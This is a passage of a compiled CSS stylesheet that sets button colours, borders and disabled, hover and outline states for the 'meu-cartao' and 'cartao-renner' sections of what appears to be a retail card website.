         .meu-cartao .button[disabled], .meu-cartao .button[disabled]:focus, .meu-cartao .button[disabled]:active, .meu-cartao .button[disabled]:hover, .meu-cartao .button.button--disabled, .meu-cartao .button.button--disabled:focus, .meu-cartao .button.button--disabled:active, .meu-cartao .button.button--disabled:hover,
         .cartao-renner .meu-cartao .button[disabled],
         .cartao-renner .meu-cartao .button[disabled]:focus,
         .cartao-renner .meu-cartao .button[disabled]:active,
         .cartao-renner .meu-cartao .button[disabled]:hover,
         .cartao-renner .meu-cartao .button.button--disabled,
         .cartao-renner .meu-cartao .button.button--disabled:focus,
         .cartao-renner .meu-cartao .button.button--disabled:active,
         .cartao-renner .meu-cartao .button.button--disabled:hover {
         border-color: #ddd;
         background-color: #ddd;
         cursor: default;
         color: #fff; }
         @media only screen and (min-width: 998px) {
         .buttons--outline .meu-cartao .button:hover, .buttons--outline .meu-cartao .button:hover:focus, .meu-cartao .button.button--outline:hover, .meu-cartao .button.button--outline:hover:focus, .buttons--outline
         .cartao-renner .meu-cartao .button:hover, .buttons--outline
         .cartao-renner .meu-cartao .button:hover:focus,
         .cartao-renner .meu-cartao .button.button--outline:hover,
         .cartao-renner .meu-cartao .button.button--outline:hover:focus {
         border-color: #91743c;
         background-color: #91743c;
         color: #fff; } }
         .buttons--outline .meu-cartao .button, .buttons--outline .meu-cartao .button:focus, .meu-cartao .button.button--outline, .meu-cartao .button.button--outline:focus, .buttons--outline
         .cartao-renner .meu-cartao .button, .buttons--outline
         .cartao-renner .meu-cartao .button:focus,
         .cartao-renner .meu-cartao .button.button--outline,
         .cartao-renner .meu-cartao .button.button--outline:focus {
         border: 1px solid #ac8947;
         background-color: #fff;
         color: #ac8947; }
         .buttons--outline .meu-cartao .button:active, .meu-cartao .button.button--outline:active, .buttons--outline
         .cartao-renner .meu-cartao .button:active,
         .cartao-renner .meu-cartao .button.button--outline:active {
         border-color: #47391d;
         background-color: #91743c;
         color: #fff; }
         :not(.loader--show) .buttons--outline .meu-cartao .button[disabled], :not(.loader--show) .buttons--outline .meu-cartao .button[disabled]:focus, :not(.loader--show) .buttons--outline .meu-cartao .button[disabled]:active, :not(.loader--show) .buttons--outline .meu-cartao .button[disabled]:hover,
         :not(.loader--show) .buttons--outline .meu-cartao .button.button--disabled,
         :not(.loader--show) .buttons--outline .meu-cartao .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline .meu-cartao .button.button--disabled:active,
         :not(.loader--show) .buttons--outline .meu-cartao .button.button--disabled:hover, :not(.loader--show) .meu-cartao .button.button--outline[disabled], :not(.loader--show) .meu-cartao .button.button--outline[disabled]:focus, :not(.loader--show) .meu-cartao .button.button--outline[disabled]:active, :not(.loader--show) .meu-cartao .button.button--outline[disabled]:hover,
         :not(.loader--show) .meu-cartao .button.button--outline.button--disabled,
         :not(.loader--show) .meu-cartao .button.button--outline.button--disabled:focus,
         :not(.loader--show) .meu-cartao .button.button--outline.button--disabled:active,
         :not(.loader--show) .meu-cartao .button.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button[disabled], :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button[disabled]:focus, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button[disabled]:active, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--disabled,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--disabled:hover, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--outline[disabled], :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--outline[disabled]:focus, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--outline[disabled]:active, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--outline[disabled]:hover,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--outline.button--disabled,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--outline.button--disabled:focus,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--outline.button--disabled:active,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--outline.button--disabled:hover {
         border: 1px solid #ddd;
         background-color: #fff;
         cursor: default;
         color: #ddd; }
         .meu-cartao .loader--show .button,
         .meu-cartao .loader--show .button[disabled],
         .cartao-renner .meu-cartao .loader--show .button,
         .cartao-renner .meu-cartao .loader--show .button[disabled] {
         border: 2px solid transparent;
         background-color: #ac8947;
         color: #fff; }
         .meu-cartao .button i svg path,
         .cartao-renner .meu-cartao .button i svg path {
         fill: #ac8947; }
         .meu-cartao .button i svg rect,
         .cartao-renner .meu-cartao .button i svg rect {
         fill: #ac8947; }
         @media only screen and (min-width: 998px) {
         .cartao-renner .button.button--default:hover, .cartao-renner .button.button--default.button--outline:hover,
         .meu-cartao .cartao-renner .button.button--default:hover,
         .meu-cartao .cartao-renner .button.button--default.button--outline:hover,
         .meu-cartao .button.button--default:hover,
         .meu-cartao .button.button--default.button--outline:hover,
         .cartao-renner .meu-cartao .button.button--default:hover,
         .cartao-renner .meu-cartao .button.button--default.button--outline:hover {
         border-color: #000;
         background-color: #000;
         color: #fff; }
         .cartao-renner .button.button--default:hover svg path, .cartao-renner .button.button--default.button--outline:hover svg path,
         .meu-cartao .cartao-renner .button.button--default:hover svg path,
         .meu-cartao .cartao-renner .button.button--default.button--outline:hover svg path,
         .meu-cartao .button.button--default:hover svg path,
         .meu-cartao .button.button--default.button--outline:hover svg path,
         .cartao-renner .meu-cartao .button.button--default:hover svg path,
         .cartao-renner .meu-cartao .button.button--default.button--outline:hover svg path {
         fill: #fff; }
         .cartao-renner .button.button--default:hover svg rect, .cartao-renner .button.button--default.button--outline:hover svg rect,
         .meu-cartao .cartao-renner .button.button--default:hover svg rect,
         .meu-cartao .cartao-renner .button.button--default.button--outline:hover svg rect,
         .meu-cartao .button.button--default:hover svg rect,
         .meu-cartao .button.button--default.button--outline:hover svg rect,
         .cartao-renner .meu-cartao .button.button--default:hover svg rect,
         .cartao-renner .meu-cartao .button.button--default.button--outline:hover svg rect {
         fill: #fff; } }
         .cartao-renner .button.button--default, .cartao-renner .button.button--default:focus, .cartao-renner .button.button--default.button--outline, .cartao-renner .button.button--default.button--outline:focus,
         .meu-cartao .cartao-renner .button.button--default,
         .meu-cartao .cartao-renner .button.button--default:focus,
         .meu-cartao .cartao-renner .button.button--default.button--outline,
         .meu-cartao .cartao-renner .button.button--default.button--outline:focus,
         .meu-cartao .button.button--default,
         .meu-cartao .button.button--default:focus,
         .meu-cartao .button.button--default.button--outline,
         .meu-cartao .button.button--default.button--outline:focus,
         .cartao-renner .meu-cartao .button.button--default,
         .cartao-renner .meu-cartao .button.button--default:focus,
         .cartao-renner .meu-cartao .button.button--default.button--outline,
         .cartao-renner .meu-cartao .button.button--default.button--outline:focus {
         border-color: #1e1e1f;
         background-color: #1e1e1f;
         color: #fff; }
         .cartao-renner .button.button--default:active, .cartao-renner .button.button--default.button--outline:active,
         .meu-cartao .cartao-renner .button.button--default:active,
         .meu-cartao .cartao-renner .button.button--default.button--outline:active,
         .meu-cartao .button.button--default:active,
         .meu-cartao .button.button--default.button--outline:active,
         .cartao-renner .meu-cartao .button.button--default:active,
         .cartao-renner .meu-cartao .button.button--default.button--outline:active {
         border-color: #000;
         background-color: #313133;
         color: #fff; }
         .cartao-renner .button.button--default:active svg path, .cartao-renner .button.button--default.button--outline:active svg path,
         .meu-cartao .cartao-renner .button.button--default:active svg path,
         .meu-cartao .cartao-renner .button.button--default.button--outline:active svg path,
         .meu-cartao .button.button--default:active svg path,
         .meu-cartao .button.button--default.button--outline:active svg path,
         .cartao-renner .meu-cartao .button.button--default:active svg path,
         .cartao-renner .meu-cartao .button.button--default.button--outline:active svg path {
         fill: #fff; }
         .cartao-renner .button.button--default:active svg rect, .cartao-renner .button.button--default.button--outline:active svg rect,
         .meu-cartao .cartao-renner .button.button--default:active svg rect,
         .meu-cartao .cartao-renner .button.button--default.button--outline:active svg rect,
         .meu-cartao .button.button--default:active svg rect,
         .meu-cartao .button.button--default.button--outline:active svg rect,
         .cartao-renner .meu-cartao .button.button--default:active svg rect,
         .cartao-renner .meu-cartao .button.button--default.button--outline:active svg rect {
         fill: #fff; }
         .cartao-renner .button.button--default[disabled], .cartao-renner .button.button--default[disabled]:focus, .cartao-renner .button.button--default[disabled]:active, .cartao-renner .button.button--default[disabled]:hover, .cartao-renner .button.button--default.button--disabled, .cartao-renner .button.button--default.button--disabled:focus, .cartao-renner .button.button--default.button--disabled:active, .cartao-renner .button.button--default.button--disabled:hover, .cartao-renner .button.button--default.button--outline[disabled], .cartao-renner .button.button--default.button--outline[disabled]:focus, .cartao-renner .button.button--default.button--outline[disabled]:active, .cartao-renner .button.button--default.button--outline[disabled]:hover, .cartao-renner .button.button--default.button--outline.button--disabled, .cartao-renner .button.button--default.button--outline.button--disabled:focus, .cartao-renner .button.button--default.button--outline.button--disabled:active, .cartao-renner .button.button--default.button--outline.button--disabled:hover,
         .meu-cartao .cartao-renner .button.button--default[disabled],
         .meu-cartao .cartao-renner .button.button--default[disabled]:focus,
         .meu-cartao .cartao-renner .button.button--default[disabled]:active,
         .meu-cartao .cartao-renner .button.button--default[disabled]:hover,
         .meu-cartao .cartao-renner .button.button--default.button--disabled,
         .meu-cartao .cartao-renner .button.button--default.button--disabled:focus,
         .meu-cartao .cartao-renner .button.button--default.button--disabled:active,
         .meu-cartao .cartao-renner .button.button--default.button--disabled:hover,
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled],
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:focus,
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:active,
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:hover,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:focus,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:active,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:hover,
         .meu-cartao .button.button--default[disabled],
         .meu-cartao .button.button--default[disabled]:focus,
         .meu-cartao .button.button--default[disabled]:active,
         .meu-cartao .button.button--default[disabled]:hover,
         .meu-cartao .button.button--default.button--disabled,
         .meu-cartao .button.button--default.button--disabled:focus,
         .meu-cartao .button.button--default.button--disabled:active,
         .meu-cartao .button.button--default.button--disabled:hover,
         .meu-cartao .button.button--default.button--outline[disabled],
         .meu-cartao .button.button--default.button--outline[disabled]:focus,
         .meu-cartao .button.button--default.button--outline[disabled]:active,
         .meu-cartao .button.button--default.button--outline[disabled]:hover,
         .meu-cartao .button.button--default.button--outline.button--disabled,
         .meu-cartao .button.button--default.button--outline.button--disabled:focus,
         .meu-cartao .button.button--default.button--outline.button--disabled:active,
         .meu-cartao .button.button--default.button--outline.button--disabled:hover,
         .cartao-renner .meu-cartao .button.button--default[disabled],
         .cartao-renner .meu-cartao .button.button--default[disabled]:focus,
         .cartao-renner .meu-cartao .button.button--default[disabled]:active,
         .cartao-renner .meu-cartao .button.button--default[disabled]:hover,
         .cartao-renner .meu-cartao .button.button--default.button--disabled,
         .cartao-renner .meu-cartao .button.button--default.button--disabled:focus,
         .cartao-renner .meu-cartao .button.button--default.button--disabled:active,
         .cartao-renner .meu-cartao .button.button--default.button--disabled:hover,
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled],
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:focus,
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:active,
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:hover,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:focus,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:active,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:hover {
         border-color: #ddd;
         background-color: #ddd;
         cursor: default;
         color: #fff; }
         @media only screen and (min-width: 998px) {
         .buttons--outline .cartao-renner .button.button--default:hover, .buttons--outline .cartao-renner .button.button--default:hover:focus, .cartao-renner .button.button--default.button--outline:hover, .cartao-renner .button.button--default.button--outline:hover:focus, .buttons--outline .cartao-renner .button.button--default.button--outline:hover, .buttons--outline .cartao-renner .button.button--default.button--outline:hover:focus, .cartao-renner .button.button--default.button--outline.button--outline:hover, .cartao-renner .button.button--default.button--outline.button--outline:hover:focus, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default:hover, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default:hover:focus,
         .meu-cartao .cartao-renner .button.button--default.button--outline:hover,
         .meu-cartao .cartao-renner .button.button--default.button--outline:hover:focus, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline:hover, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline:hover:focus,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline:hover,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline:hover:focus, .buttons--outline
         .meu-cartao .button.button--default:hover, .buttons--outline
         .meu-cartao .button.button--default:hover:focus,
         .meu-cartao .button.button--default.button--outline:hover,
         .meu-cartao .button.button--default.button--outline:hover:focus, .buttons--outline
         .meu-cartao .button.button--default.button--outline:hover, .buttons--outline
         .meu-cartao .button.button--default.button--outline:hover:focus,
         .meu-cartao .button.button--default.button--outline.button--outline:hover,
         .meu-cartao .button.button--default.button--outline.button--outline:hover:focus, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default:hover, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default:hover:focus,
         .cartao-renner .meu-cartao .button.button--default.button--outline:hover,
         .cartao-renner .meu-cartao .button.button--default.button--outline:hover:focus, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline:hover, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline:hover:focus,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline:hover,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline:hover:focus {
         border-color: #000;
         background-color: #000;
         color: #fff; } }
         .buttons--outline .cartao-renner .button.button--default, .buttons--outline .cartao-renner .button.button--default:focus, .cartao-renner .button.button--default.button--outline, .cartao-renner .button.button--default.button--outline:focus, .buttons--outline .cartao-renner .button.button--default.button--outline, .buttons--outline .cartao-renner .button.button--default.button--outline:focus, .cartao-renner .button.button--default.button--outline.button--outline, .cartao-renner .button.button--default.button--outline.button--outline:focus, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default:focus,
         .meu-cartao .cartao-renner .button.button--default.button--outline,
         .meu-cartao .cartao-renner .button.button--default.button--outline:focus, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline:focus,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline:focus, .buttons--outline
         .meu-cartao .button.button--default, .buttons--outline
         .meu-cartao .button.button--default:focus,
         .meu-cartao .button.button--default.button--outline,
         .meu-cartao .button.button--default.button--outline:focus, .buttons--outline
         .meu-cartao .button.button--default.button--outline, .buttons--outline
         .meu-cartao .button.button--default.button--outline:focus,
         .meu-cartao .button.button--default.button--outline.button--outline,
         .meu-cartao .button.button--default.button--outline.button--outline:focus, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default:focus,
         .cartao-renner .meu-cartao .button.button--default.button--outline,
         .cartao-renner .meu-cartao .button.button--default.button--outline:focus, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline:focus,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline:focus {
         border: 1px solid #1e1e1f;
         background-color: #fff;
         color: #1e1e1f; }
         .buttons--outline .cartao-renner .button.button--default:active, .cartao-renner .button.button--default.button--outline:active, .buttons--outline .cartao-renner .button.button--default.button--outline:active, .cartao-renner .button.button--default.button--outline.button--outline:active, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default:active,
         .meu-cartao .cartao-renner .button.button--default.button--outline:active, .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline:active,
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline:active, .buttons--outline
         .meu-cartao .button.button--default:active,
         .meu-cartao .button.button--default.button--outline:active, .buttons--outline
         .meu-cartao .button.button--default.button--outline:active,
         .meu-cartao .button.button--default.button--outline.button--outline:active, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default:active,
         .cartao-renner .meu-cartao .button.button--default.button--outline:active, .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline:active,
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline:active {
         border-color: #000;
         background-color: #313133;
         color: #fff; }
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default[disabled], :not(.loader--show) .buttons--outline .cartao-renner .button.button--default[disabled]:focus, :not(.loader--show) .buttons--outline .cartao-renner .button.button--default[disabled]:active, :not(.loader--show) .buttons--outline .cartao-renner .button.button--default[disabled]:hover,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--disabled,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--disabled:focus,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--disabled:active,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--disabled:hover, :not(.loader--show) .cartao-renner .button.button--default.button--outline[disabled], :not(.loader--show) .cartao-renner .button.button--default.button--outline[disabled]:focus, :not(.loader--show) .cartao-renner .button.button--default.button--outline[disabled]:active, :not(.loader--show) .cartao-renner .button.button--default.button--outline[disabled]:hover,
         :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--disabled,
         :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--disabled:focus,
         :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--disabled:active,
         :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline[disabled], :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline[disabled]:focus, :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline[disabled]:active, :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline[disabled]:hover,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline.button--disabled,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline.button--disabled:focus,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline.button--disabled:active,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline.button--disabled:hover, :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline[disabled], :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline[disabled]:focus, :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline[disabled]:active, :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline[disabled]:hover,
         :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline.button--disabled,
         :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:focus,
         :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:active,
         :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default[disabled], :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default[disabled]:focus, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default[disabled]:active, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--disabled,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--disabled:hover, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled], :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:focus, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:active, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:hover,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:focus,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:active,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled], :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:focus, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:active, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:hover, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline[disabled], :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline[disabled]:focus, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline[disabled]:active, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline[disabled]:hover,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline.button--disabled,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:focus,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:active,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default[disabled], :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default[disabled]:focus, :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default[disabled]:active, :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--disabled,
         :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--disabled:hover, :not(.loader--show)
         .meu-cartao .button.button--default.button--outline[disabled], :not(.loader--show)
         .meu-cartao .button.button--default.button--outline[disabled]:focus, :not(.loader--show)
         .meu-cartao .button.button--default.button--outline[disabled]:active, :not(.loader--show)
         .meu-cartao .button.button--default.button--outline[disabled]:hover,
         :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--disabled,
         :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--disabled:focus,
         :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--disabled:active,
         :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--outline[disabled], :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--outline[disabled]:focus, :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--outline[disabled]:active, :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--outline[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--outline.button--disabled,
         :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--outline.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--outline.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .meu-cartao .button.button--default.button--outline.button--disabled:hover, :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--outline[disabled], :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--outline[disabled]:focus, :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--outline[disabled]:active, :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--outline[disabled]:hover,
         :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--outline.button--disabled,
         :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:focus,
         :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:active,
         :not(.loader--show)
         .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default[disabled], :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default[disabled]:focus, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default[disabled]:active, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--disabled,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--disabled:hover, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled], :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:focus, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:active, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:hover,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:focus,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:active,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled], :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:focus, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:active, :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:hover, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline[disabled], :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline[disabled]:focus, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline[disabled]:active, :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline[disabled]:hover,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline.button--disabled,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:focus,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:active,
         :not(.loader--show)
         .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:hover {
         border: 1px solid #ddd;
         background-color: #fff;
         cursor: default;
         color: #ddd; }
         @media only screen and (min-width: 998px) {
         .cartao-renner .single-page-button .button:hover,
         .meu-cartao .single-page-button .button:hover,
         .meu-cartao .cartao-renner .single-page-button .button:hover,
         .cartao-renner .meu-cartao .single-page-button .button:hover {
         border-color: #000;
         background-color: #000;
         color: #fff; }
         .cartao-renner .single-page-button .button:hover svg path,
         .meu-cartao .single-page-button .button:hover svg path,
         .meu-cartao .cartao-renner .single-page-button .button:hover svg path,
         .cartao-renner .meu-cartao .single-page-button .button:hover svg path {
         fill: #fff; }
         .cartao-renner .single-page-button .button:hover svg rect,
         .meu-cartao .single-page-button .button:hover svg rect,
         .meu-cartao .cartao-renner .single-page-button .button:hover svg rect,
         .cartao-renner .meu-cartao .single-page-button .button:hover svg rect {
         fill: #fff; } }
         .cartao-renner .single-page-button .button, .cartao-renner .single-page-button .button:focus,
         .meu-cartao .single-page-button .button,
         .meu-cartao .single-page-button .button:focus,
         .meu-cartao .cartao-renner .single-page-button .button,
         .meu-cartao .cartao-renner .single-page-button .button:focus,
